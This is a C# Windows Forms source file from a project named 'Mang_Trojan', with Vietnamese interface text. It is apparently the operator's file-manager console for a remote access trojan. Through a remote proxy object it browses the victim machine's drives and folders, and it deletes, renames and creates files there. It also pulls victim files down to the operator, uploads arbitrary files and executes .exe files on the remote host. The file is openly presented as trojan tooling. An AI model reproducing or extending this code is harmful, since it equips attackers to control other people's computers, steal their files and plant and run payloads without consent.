using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
namespace Mang_Trojan.form
{
    public partial class FileManager : Form
    {
        RemoteObject.ScreenObject hostInstance;
        private string path;
        private string SelectedDriver="";
        private ListViewHitTestInfo selected;
        byte[] file;
        string fileName;
        public FileManager(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.treeView1.ImageList = new ImageList();
            Bitmap folder = Resource1.am_folder;
            this.treeView1.ImageList.Images.Add(folder);
     
            this.hostInstance = hostInstance;

            this.Text = "Quản lý file " + hostInstance.GetComputerName();
        }

       

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                hostInstance.Delete(path + selected.Item.Text);
                listView1.Items.Clear();
                HandleFiles(path);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void renameToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            InputBoxResult rename = InputBox.Show("Nhập tên tập tin mới", "Đổi tên " + selected.Item.Text, selected.Item.Text);
            if (rename.ReturnCode == DialogResult.OK)
            {
                if (rename.Text != string.Empty)
                {
                    hostInstance.Rename(path + selected.Item.Text, path + rename.Text);
                }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            HandleFiles(path);
        }

        private void fileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            InputBoxResult box = InputBox.Show("Tên tập tin", "Điền tên tập tin.");
            if (box.ReturnCode == DialogResult.OK)
            {
                hostInstance.Create(path + box.Text);
            }
        }

        private void fodderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            InputBoxResult box = InputBox.Show("Tạo thư mục mới", "Điền tên thư mục.");
            if (box.ReturnCode == DialogResult.OK)
            {
                hostInstance.CreateFolder(path + box.Text);
            }
        }

        #region Download,upload
        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
          //  string a =selected.Item.Text;
            if (selected.Item !=null)
            {
                byte[] buff = hostInstance.Download(path + selected.Item.Text);
                saveFileDialog1.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                saveFileDialog1.Filter =
                   "All files (*.*)|*.*|All files (*.*)|*.*";
                saveFileDialog1.FileName = selected.Item.Text;
                if (saveFileDialog1.ShowDialog() == DialogResult.OK && saveFileDialog1.FileName != string.Empty)
                {
                    try
                    {
                        FileStream fs = new FileStream(saveFileDialog1.FileName, FileMode.Create, FileAccess.ReadWrite);
                        BinaryWriter bw = new BinaryWriter(fs);
                        bw.Write(buff);
                        bw.Close();

                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                    MessageBox.Show("Tải về hoàn thành!! ");
                }
            }
            else
            {
                MessageBox.Show("Bạn chưa chọn tập tin");
            }
             
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            dialog.Filter =
               "All files (*.*)|*.*|All files (*.*)|*.*";
            if (dialog.ShowDialog() == DialogResult.OK&&dialog.FileName != string.Empty)
            {
               file = System.IO.File.ReadAllBytes(dialog.FileName); 
                fileName=dialog.FileName;
            }
            int i = fileName.LastIndexOf("\\");
            path = path + fileName.Substring(i + 1);

            if (hostInstance.Upload(file, path))
            {
                MessageBox.Show("Tải lên hoàn thành");

            }
            else
            {
                MessageBox.Show("Lỗi");
            }
        }

        #endregion
       
        private void excuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string ext = selected.Item.Text.Substring(selected.Item.Text.Length - 4);
            if (ext.ToLower() == ".exe")
            {
               hostInstance.Execute(path + selected.Item.Text);
            }
            else
            {
                MessageBox.Show("Chỉ có thể chạy tập tin có đuôi .exe.");
            }
        }



        
        private void FileManager_Load(object sender, EventArgs e)
        {
            string allDriver = hostInstance.GetDrives();
            string[] drivers = allDriver.Split(new string[] {Environment.NewLine }, StringSplitOptions.None);
            foreach (string driver in drivers)
            {
                if (driver != string.Empty)
                {
                    treeView1.Nodes.Add(driver);
                }
            }
        }

        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            string _path = e.Node.Text;
            TreeNode temp = e.Node.Parent;
            while (true)
            {
                if (temp != null)
                {
                    _path = temp.Text + "\\" + _path;
                    temp = temp.Parent;
                }
                else
                {
                    break;
                }
            }
            path = SelectedDriver + _path + "\\";
            
                string AllDirs = hostInstance.GetDirs(path);
                if (!AllDirs.Equals("Thiết bị chưa sẵn sàng.\r\n"))
                {
                    string[] dirs = AllDirs.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);

                    if (e.Node.Nodes.Count != 0)
                    {
                        e.Node.Nodes.Clear();
                    }
                    foreach (string dir in dirs)
                    {
                        if (dir != string.Empty && dir != Environment.NewLine)
                        {

                            e.Node.Nodes.Add(dir);
                        }
                    }
                    if (e.Node.Nodes.Count != 0)
                    {
                        e.Node.Expand();
                    }
                }
                else
                {
                    MessageBox.Show("Thiết bị chưa sẵn sàng");
                }
                
            
            listView1.Items.Clear();
            HandleFiles(path);

        }

        private void HandleFiles(string path)
        {
            
                string allFiles = hostInstance.GetFiles(path);
                if (!allFiles.Equals("Thiết bị chưa sẵn sàng.\r\n"))
                {
                    string[] files = allFiles.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
                    foreach (string file in files)
                    {
                        if (file != string.Empty)
                        {
                            string[] temp = file.Split(new string[] { "|*|" }, StringSplitOptions.None);
                            ListViewItem item = new ListViewItem(temp[0]);
                            for (int i = 1; i < temp.Length; i++)
                            {
                                item.SubItems.Add(temp[i]);
                            }
                            listView1.Items.Add(item);
                        }
                    }
                }
                else
                {
                    MessageBox.Show("Lỗi");
                }
            }
            
        

        private void listView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                selected = listView1.HitTest(e.X, e.Y);
                contextMenuStrip1.Show(listView1, e.Location);
            }
        }
    }
}
